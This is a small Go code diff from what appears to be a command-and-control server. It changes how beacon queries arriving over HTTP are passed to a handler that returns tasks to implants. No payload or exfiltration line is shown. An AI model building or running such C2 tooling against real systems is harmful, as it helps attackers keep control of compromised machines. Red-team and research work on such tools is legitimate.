@@ -200,7 +200,7 @@ func (c2 *C2Manager) ProcessHTTPMessage(decoded, clientIP string, encrypted bool
 	qname := fmt.Sprintf("%s.%d.%s", encoded, time.Now().Unix(), c2.domain)
 
 	var info C2QueryInfo
-	response, hasTask, respEncrypted = c2.processBeaconQuery(qname, clientIP, &info, 16 /* TXT: deliver, do not peek */)
+	response, hasTask, respEncrypted = c2.processBeaconQuery(qname, clientIP, &info, "http", 16 /* TXT: deliver, do not peek */)
 
 	if c2.debug && response != "" {
 		logf("[HTTP] %s -> %s (%s)", info.MsgType, truncateForLog(response, 60), clientIP)
